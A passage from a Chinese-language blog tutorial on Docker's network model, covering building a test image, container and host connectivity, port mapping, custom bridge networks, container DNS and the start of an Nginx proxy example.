    <content type="html"><![CDATA[<h1 id="深入浅出docker应用-docker网络模型">深入浅出docker应用-Docker网络模型</h1><h2 id="容器的网络入门">容器的网络入门</h2><h3 id="创建实验环境镜像">创建实验环境镜像</h3><p>在前面的实验中我们学习了Docker中的容器和容器镜像的用法。而容器作为一种虚拟机技术，其网络和存储模型也是非常重要的知识重点，因此本实验中我们讲的带领大家学习容器的网络模型的基本概念。</p><ol type="1"><li>编写自定义Dockerfile</li></ol><p>为了后续实验的进行，我们先来创建一个包含<code>python</code>环境的自定义镜像，我们基于python3.7构建实验镜像。接下来我们为实验镜像配置aliyun的ubuntu的apt源，并且进行apt的初始化操作，在初始化完成之后。我们为镜像安装<code>curl</code>，<code>ping</code>，<code>ifconfig</code>，<code>traceroute</code>等常用网络工具。最后我们设置镜像运行时在<code>8000</code>端口启动python3内置的<code>http</code>服务。</p><p>我们通过vi编辑Dockerfile，并将下面的内容添加到中Dockerfile中，注意使用vim编辑器时：</p><ol type="1"><li>需要先按<code>i</code>键进入编辑模式。</li><li>编辑完成之后按esc退出编辑模式。</li><li>然后按<code>:wq</code>保存并退出vim。</li></ol><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-g7ah84lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-g7ah84lmrh9u69"><pre><code class="hljs shell">vim Dockerfile</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8szbgmlmrh9u69"></i><span>dockerfile</span><div class="collapse show" id="collapse-8szbgmlmrh9u69"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> python:<span class="hljs-number">3.7</span><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8000</span><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">"deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse \n\</span></span><span class="hljs-string"><span class="language-bash">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse \n\</span></span><span class="hljs-string"><span class="language-bash">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse \n\</span></span><span class="hljs-string"><span class="language-bash">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse \n\</span></span><span class="hljs-string"><span class="language-bash">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse \n\</span></span><span class="hljs-string"><span class="language-bash">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse \n\</span></span><span class="hljs-string"><span class="language-bash">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse \n\</span></span><span class="hljs-string"><span class="language-bash">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse \n\</span></span><span class="hljs-string"><span class="language-bash">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse \n\</span></span><span class="hljs-string"><span class="language-bash">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse"</span> &gt; /etc/apt/sources.list</span><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32</span><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update</span><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y curl net-tools inetutils-ping traceroute</span><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">"python3"</span>, <span class="hljs-string">"-m"</span>, <span class="hljs-string">"http.server"</span>, <span class="hljs-string">"8000"</span>]</span></code></pre></div></div><ol start="2" type="1"><li>编译镜像</li></ol><p>编辑好Dockerfile之后，通过<code>docker build</code>命令生成新的镜像。注意镜像生成过程中，需要通过网络安装相关组件，因此容器构建时间可能会比较长。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ne4g51lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-ne4g51lmrh9u69"><pre><code class="hljs shell">docker build -t py/http .docker images</code></pre></div></div><ol start="3" type="1"><li>验证镜像</li></ol><p>容器制作完毕后，我们创建容器，然后使用<code>docker exec</code>命令在容器中执行<code>curl 127.0.0.1:8000</code>验证服务的启动。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-cnntltlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-cnntltlmrh9u69"><pre><code class="hljs shell">docker run -itd --name check py/httpdocker exec check curl 127.0.0.1:8000docker rm -f check</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906115927011432_829_image-20230905162033315.png" alt="image-20230905162033315"><figcaption aria-hidden="true">image-20230905162033315</figcaption></figure><h3 id="容器和宿主机中的网卡">容器和宿主机中的网卡</h3><p>实验环境创建成功后，接下来我们来学习容器和宿主机中的网卡信息</p><ol type="1"><li>容器的网卡信息</li></ol><p>创建容器后。docker会为容器默认创建一块虚拟网卡。容器通过这块网卡实现网络连接，为了验证容器的网卡，我们首先用自定义镜像py/http创建两个容器，当容器创建好之后，我们通过dockerinspect命令查看容器详细信息，详细信息中包含容器网卡的IP。为了简化容器信息的查看，我们可以使用-f参数来筛选容器的信息。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-x2v5jflmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-x2v5jflmrh9u69"><pre><code class="hljs shell">docker run -itd --name py1 py/httpdocker run -itd --name py2 py/httpdocker inspect -f '{{.NetworkSettings.IPAddress }}' py1docker inspect -f '{{.NetworkSettings.IPAddress }}' py2</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906115930659188_491_image-20230905162231861.png" alt="image-20230905162231861"><figcaption aria-hidden="true">image-20230905162231861</figcaption></figure><ol start="2" type="1"><li>多容器信息查询</li></ol><p>当Docker中的容器或者容器镜像数量较多的时候，每次使用一条命令来查询一个容器或者镜像信息就会变得非常的繁琐。这时我们就可以使用<code>docker ps</code>中<code>-f "name=value"</code>参数过滤所需要的对象，再用<code>-q</code>参数只获得所需要对象的ID。</p><p>接下来再配合linux命令行的<code>$()</code>，将对象的ID作为参数传给<code>docker inspect</code>命令。这样就可以一次性获得所有对象的配置信息。我们通过下列命令显示所有容器名称包含<code>py</code>的容器的IP地址。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2bnstdlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-2bnstdlmrh9u69"><pre><code class="hljs shell">docker ps -f "name=py" -qdocker inspect -f '{{.Name}} {{.NetworkSettings.IPAddress }}' $(docker ps -f "name=py" -q)</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906115935274383_307_image-20230905163325242.png" alt="image-20230905163325242"><figcaption aria-hidden="true">image-20230905163325242</figcaption></figure><ol start="3" type="1"><li>宿主机的网卡信息</li></ol><p>在docker安装之后，也会在宿主机上安装一块默认的虚拟网卡<code>docker0</code>，该网卡可以和容器中的虚拟网卡互联互通。我们先通过<code>ifconfig</code>查看docker0的网卡信息。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bxb12elmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-bxb12elmrh9u69"><pre><code class="hljs shell">ifconfig docker0</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906115939701805_748_image-20230905163118101.png" alt="image-20230905163118101"><figcaption aria-hidden="true">image-20230905163118101</figcaption></figure><h3 id="容器和宿主机的连通性">容器和宿主机的连通性</h3><p>本小节中我们来测试容器和宿主机网络连通性</p><ol type="1"><li>测试宿主机和容器之间的连通性</li></ol><p>接下来我们来测试的宿主机和容器网卡的互联互通，会发现在默认情况下，宿主机可以通过<code>docker0</code>网卡访问容器中的服务。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-uvk9bslmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-uvk9bslmrh9u69"><pre><code class="hljs shell">ping -c 4 [py1容器IP]curl [py1容器IP]:8000ping -c 4 [py2容器IP]curl [py2容器IP]:8000</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906115944397056_252_image-20230905162945636.png" alt="image-20230905162945636"><figcaption aria-hidden="true">image-20230905162945636</figcaption></figure><ol start="2" type="1"><li>容器之间的网络连接</li></ol><p>接下来我们来测试容器之间的网络连通性，我们通过<code>ifconfig</code>命令查看容器详细信息，会可以发现各容器的的IP地址属于同一个子网，这种设置保证了容器之间的网卡可以互联互通，为了验证我们进入py1容器的控制台，然后测试py1到宿主机和py2的连通性。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-emq0wmlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-emq0wmlmrh9u69"><pre><code class="hljs shell">docker exec -it py1 /bin/bashping -c 4 [docker0 IP]ping -c 4 [py2容器IP]curl [py2容器IP]:8000exit</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906115949958075_213_image-20230905163234783.png" alt="image-20230905163234783"><figcaption aria-hidden="true">image-20230905163234783</figcaption></figure><ol start="3" type="1"><li>容器的外网访问</li></ol><p>在上一个步骤中查看容器的网络信息时，我们会发现容器的网卡中<strong>网关IP</strong>正是宿主机的<code>docker0</code>网卡的IP。</p><blockquote><p>注：可通过<code>netstat -rn</code>查看。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906115952557471_924_image-20230905165716152.png" alt="image-20230905165716152"><figcaption aria-hidden="true">image-20230905165716152</figcaption></figure></blockquote><p>这就意味着，如果容器的宿主机可以访问互联网，容器就可以通过宿主机的<code>docker0</code>网卡转发网络数据包访问互联网。为了验证我们进入py1容器的控制台，<code>ping</code>访问<code>aliyun.com</code>验证连通性，再通过<code>traceroute</code>命令验证容器访问外网的路径。会发现容器访问外网的第一条就是<code>docker0</code>网卡。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5xati9lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-5xati9lmrh9u69"><pre><code class="hljs shell">docker exec -it py1 /bin/bashping -c 4 www.aliyun.comtraceroute www.aliyun.com -w 0.1exit</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906115956774933_957_image-20230905164231855.png" alt="image-20230905164231855"><figcaption aria-hidden="true">image-20230905164231855</figcaption></figure><h3 id="容器的端口映射">容器的端口映射</h3><p>在上面的几个小节中我们学习了了，容器和宿主机的互相访问，容器和容器的互相访问，以及容器对外网的访问。但是由于容器本身使用了Docker创建的私有网络地址，虽然可以通过<code>docker0</code>网卡转发访问外网，但是无法提供服务，让外网的使用者来访问。</p><p>为了解决这个问题，我们就需要用到容器的端口映射功能。通过端口映射功能，我们可以将宿主机的一个端口和一个指定容器的端口进行映射绑定，所有对宿主机端口的访问数据包，都会自动转发到指定容器的端口上。这样只要外网访问者只要能访问到宿主机，就可以通过端口映射功能，访问到容器中的服务。从而实现了通过容器对外发布服务的能力。</p><p>本小节中我们就来为大家演示Docker端口映射的常用用法。</p><ol type="1"><li>端口映射的基本用法</li></ol><p>第一种用法就是在<code>docker run</code>中通过<code>-p</code>参数进行容器和宿主机的端口映射绑定。<code>-p</code>参数有两种用法，第一种是分别指定宿主机端口和容器端口，其语法格式为<code>-p 宿主机端口:容器端口</code>；第二种是只指定容器端口，由docker自动分配宿主机端口。其语法格式为<code>-p 容器端口</code>。</p><p>如果需要为容器指定映射多个端口，可以在<code>docker run</code>中使用多个<code>-p</code>参数。在使用端口映射启动容器之后，我们可以通过<code>docker ps</code>命令查看容器的端口映射配置。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-b7x38blmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-b7x38blmrh9u69"><pre><code class="hljs shell">docker run -itd -p 18000:8000 -p 18001:8000 --name port1 py/httpdocker run -itd -p 8000 --name port2 py/httpdocker ps -f "name=port"</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906115959456283_323_image-20230905164540108.png" alt="image-20230905164540108"><figcaption aria-hidden="true">image-20230905164540108</figcaption></figure><ol start="2" type="1"><li>查看端口映射</li></ol><p>端口映射完成后，我们往往需要查看映射信息，尤其是对docker自动分配宿主机端口的映射方式。除了可以用<code>docker ps</code>命令查看映射信息之外。还可以使用<code>docker port</code>命令查看映射信息，其调用格式为<code>docker port 容器名</code>或者<code>docker port 容器名 容器端口</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5wdiallmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-5wdiallmrh9u69"><pre><code class="hljs shell">docker port port1docker port port1 8000docker port port2</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906120003330128_908_image-20230905164647019.png" alt="image-20230905164647019"><figcaption aria-hidden="true">image-20230905164647019</figcaption></figure><blockquote><p>总结：配端口映射的时候是宿主:容器，查看时是容器 -&gt; 宿主。</p></blockquote><ol start="3" type="1"><li>验证端口映射</li></ol><p>当我们确定了容器在宿主机上的映射端口之后，我们就可以在宿主机上通过<code>curl</code>命令来验证映射功能。为了控制<code>curl</code>命令的输出，我们可以使用linux的|语法，配置<code>head -n1</code>压缩网页输出。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-i1b4ozlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-i1b4ozlmrh9u69"><pre><code class="hljs shell">curl 127.0.0.1:18000 | head -n1curl 127.0.0.1:18001 | head -n1curl 127.0.0.1:[port2宿主机端口]  | head -n1</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906120005817916_620_image-20230905164942645.png" alt="image-20230905164942645"><figcaption aria-hidden="true">image-20230905164942645</figcaption></figure><h2 id="容器的自定义网络">容器的自定义网络</h2><h3 id="使用自定义网络">使用自定义网络</h3><p>在上一个实验中我们讲解了Docker中默认网络模式下的网卡，连通性和端口映射。实际上在Docker中，一共包含了五种网络模式。分别是<code>None</code>，<code>Bridge</code>，<code>Host</code>，<code>Container</code>和<code>自定义模型</code>。其中<code>None</code>模式为无网络容器，在默认情况下Docker中的容器使用的是<code>Bridge</code>网络模型。<code>Host</code>和<code>Container</code>是两种共享网络模型。在本实验中我们来重点讲解<code>Bridge</code>模型。</p><p>Bridge网络模式的网络架构，是一种类似家用路由器的NAT网络架构。在这种架构中内网和外网使用不同的网络地址，容器中的网卡和宿主机中的Docker网卡（默认为Docker0）使用<strong>私有的内网地址</strong>，同时宿主机Docker网卡作为容器中的网卡的默认网关。而宿主机的物理网卡作为外网使用<strong>外网地址</strong>。</p><p>当容器需要访问外网时，Docker通过网络地址转换（NAT）将内网对外的访问请求转发到宿主机的物理网卡实现外网访问。当外网需要访问容器中的服务时，Docker使用目标网络地址转换（DNAT）,实现容器的端口映射功能。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121438023132_943_image-20230905171448071.png" alt="image-20230905171448071" width="50%" height="50%"></p><ol type="1"><li>自定义Bridge网络</li></ol><p>在上面的说明中，为大家简单介绍了Docker的Bridge网络模型。在默认情况下新创建的容器会使用Bridge网络模型，同时使用<code>docker 0</code>网卡作为默认网关。在使用bridge模型时，除了使用默认的docker0网卡之外。我们还可以使用<code>docker network</code>创建新的宿主机容器网络。</p><p>在创建新的容器网络时我们使用<code>docker network create</code>命令，并且可以使用<code>--gateway</code>参数指定网卡的地址，以及使用<code>--subnet</code>内网地址的网络地址段。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-awn3ihlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-awn3ihlmrh9u69"><pre><code class="hljs shell">docker network create --gateway 192.168.0.1 --subnet 192.168.0.0/24  network1</code></pre></div></div><ol start="2" type="1"><li>查看Bridge网络</li></ol><p>dockernetwork除了可以创建自定义网络之外，还可以使用<code>docker network ls</code>查看已有的Docker网络。对于单个网络也可以使用<code>docker inspect</code>命令查看详细配置。</p><p>另外当自定义bridge网络创建之后，通过宿主机的<code>ifconfig</code>命令可以发现在宿主机中生成了一块新的网卡，网卡的名称前缀为<code>br-</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hy0lu9lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-hy0lu9lmrh9u69"><pre><code class="hljs shell">docker network lsdocker inspect network1</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121443459226_284_image-20230905171940633.png" alt="image-20230905171940633"><figcaption aria-hidden="true">image-20230905171940633</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-atjwx4lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-atjwx4lmrh9u69"><pre><code class="hljs shell">ifconfig -sifconfig br-[网络ID]</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121448940363_596_image-20230905172129476.png" alt="image-20230905172129476"><figcaption aria-hidden="true">image-20230905172129476</figcaption></figure><ol start="3" type="1"><li>加入自定义Bridge网络</li></ol><p>自定义网络创建完毕后，就可以在<code>docker run</code>运行容器的时候，使用<code>--network</code>参数指定容器使用某一个网络，同时我们还可以使用<code>--ip</code>参数指定容器的IP地址。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pbo349lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-pbo349lmrh9u69"><pre><code class="hljs shell">docker run -itd --name busybox1 --network network1 --ip 192.168.0.101 busyboxdocker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' busybox1</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121454346633_249_image-20230905172402430.png" alt="image-20230905172402430"><figcaption aria-hidden="true">image-20230905172402430</figcaption></figure><h3 id="多网络的连通性">多网络的连通性</h3><p>在上一个小节中，我们介绍了通过dockernetwork自定义Bridge网络。接下来我们来看一下不同网络之间的容器的连通性问题。</p><ol type="1"><li>不同Bridge网络的连通性</li></ol><p>我们尝试在默认的<code>docker0</code>网络中再创建一个容器<code>busybox2</code>，然后通过<code>docker exec</code>命令在<code>busybox2</code>中执行<code>ping</code>命令，来测试该容器和上一个步骤中创建的<code>busybox1</code>之间的连通性。会发现不同网络之间的容器无法互联互通。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pxsazqlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-pxsazqlmrh9u69"><pre><code class="hljs shell">docker run -itd --name busybox2 busyboxdocker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' busybox2docker exec busybox2 ping 192.168.0.101 -w 1</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121458521078_985_image-20230905172614913.png" alt="image-20230905172614913"><figcaption aria-hidden="true">image-20230905172614913</figcaption></figure><ol start="2" type="1"><li>容器连接多网络</li></ol><p>如果我们需要让处在不同docker网络之间的容器互联互通，从宿主机网络上配置，一般我们可以采用手动配置路由的方式。</p><p>除此之外我们还可以从容器上进行配置来解决这个问题。而解决的方式就是通过<code>docker network connect</code>命令为容器创建一个新的网络连接。接下来我们来演示将已经运行容器<code>busybox2</code>，连接到<code>network1</code>网络上。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bb2cw2lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-bb2cw2lmrh9u69"><pre><code class="hljs shell">docker network connect --ip 192.168.0.102 network1 busybox2</code></pre></div></div><ol start="3" type="1"><li>验证多网络连接</li></ol><p>网络联通之后，我们再次测试ping命令。会发现busybox2容器已经可以ping通busybox1容器的网络地址。通过ipadd命令。我们发现当使用<code>docker network connect</code>命令创建连接之后，在容器中会生成一块与之对应的新的网卡。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-srpejrlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-srpejrlmrh9u69"><pre><code class="hljs shell">docker exec busybox2 ping 192.168.0.101 -w 1docker exec busybox2 ip addr</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121502122637_753_image-20230905173151504.png" alt="image-20230905173151504"><figcaption aria-hidden="true">image-20230905173151504</figcaption></figure><h3 id="容器中的域名解析">容器中的域名解析</h3><p>在我们实际使用Docker时，一般来说并不建议将所有的服务的部署在一个容器中，而是尽量让一个容器中只包含一个服务。然后将多个容器加入同一个网络时，如果一个容器中的服务希望访问另一个容器中的服务，就需要知道另一个容器的网络地址才能进行调用。</p><p>但是在应用开发阶段，开发者往往并不知道应用所依赖的服务会被部署到具体哪个网络地址。在这种情况下，我们通常会使用域名来解决这个问题，也就是使用一个字符串作为域名表述一个服务的网络地址。然后再容器之上配置DNS域名解析服务，将域名字符串转换成具体IP地址。</p><ol type="1"><li>默认网络容器链接</li></ol><p>在docker0默认网络中，我们可以使用<code>--link</code>参数链接一个已经启动的容器。当一个容器使用<code>--link</code>链接到另一个容器之后，在该容器在创建时会在容器中配置本地静态DNS域名文件，将被链接容器的容器名解析成被链接容器的IP地址。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lbizbplmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-lbizbplmrh9u69"><pre><code class="hljs shell">docker run -itd --name domain1 --network network1 busyboxdocker exec domain1 ping busybox1 -c1docker exec domain1 ping domain1 -c1</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121505575156_739_image-20230905173743604.png" alt="image-20230905173743604"><figcaption aria-hidden="true">image-20230905173743604</figcaption></figure><blockquote><p>注：下面两条是为了验证 domain1 正确的加入到network1。</p></blockquote><ol start="2" type="1"><li>自定义网络中得DNS</li></ol><p>而在自定义网络中，docker会为自动为网络中的容器添加一个内置的动态DNS服务。在同一网络中容器之间，可以直接使用容器名进行访问。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-yjlz5nlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-yjlz5nlmrh9u69"><pre><code class="hljs shell">docker run -itd --name domain3 --network network1 busyboxdocker run -itd --name domain4 --network network1 busyboxdocker exec domain3 ping domain3 -c1docker exec domain3 ping domain4 -c1</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121513885053_753_image-20230905174021497.png" alt="image-20230905174021497"><figcaption aria-hidden="true">image-20230905174021497</figcaption></figure><blockquote><p>domain3和domain4在同一网络，验证通过动态DNS配置的容器名域名能够ping的通。</p></blockquote><ol start="3" type="1"><li>网络别名</li></ol><p>除了使用容器名称之外，我们还可在使用<code>docker run</code>创建容器得时候使用<code>--network-alias</code>参数设置网络别名作为域名。<code>--network-alias</code>参数和<code>-p</code>参数一样，可以并列设置多个，同时设置多个域名。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gf8j1nlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-gf8j1nlmrh9u69"><pre><code class="hljs shell">docker run -itd --name domain2 --network-alias web --network-alias db --network network1 busyboxdocker exec domain1 ping domain2 -c1docker exec domain1 ping web -c1docker exec domain1 ping db -c1</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121519436040_631_image-20230905174308569.png" alt="image-20230905174308569"><figcaption aria-hidden="true">image-20230905174308569</figcaption></figure><h3 id="容器实现nginx代理">容器实现Nginx代理</h3><p>在上面的步骤中我们讲解了容器中的自定义网络。接下来我们来看一个简单的Nginx代理，来理解自定义网络。在这个例子中，我们创建三个容器，一个通过Python启动http服务，一个启动apahce服务，然后在一个Nginx服务中配置代理，让他转发其他两个服务，并且对外通过端口映射提供服务。</p><ol type="1"><li>容器准备</li></ol><p>首先为了避免干扰，我们先删除全部容器。接下来我们创建两个容器，一个是名为python1的python容器，创建之后在80端口启动内置http服务(<code>python3 -m http.server 80</code>)。另一个名为httpd1的httpd容器，也就是apahce服务，默认在80端口启动服务。</p><p>在容器创建成功后，我们使用curl进行测试。这里我们使用组合命令，先获取容器得IP，然后作为参数传递给curl。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-m0kx5tlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-m0kx5tlmrh9u69"><pre><code class="hljs shell">docker rm -f $(docker ps -aq)docker run -d --name python1 python python3 -m http.server 80docker run -d --name httpd1 httpdcurl $(docker inspect python1 -f {{.NetworkSettings.IPAddress}})curl $(docker inspect httpd1 -f {{.NetworkSettings.IPAddress}})</code></pre></div></div><blockquote><p>注：该过程下载较慢，需要耐心等待。</p></blockquote><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121524109420_497_image-20230905175352061.png" alt="image-20230905175352061"><figcaption aria-hidden="true">image-20230905175352061</figcaption></figure><figure><img 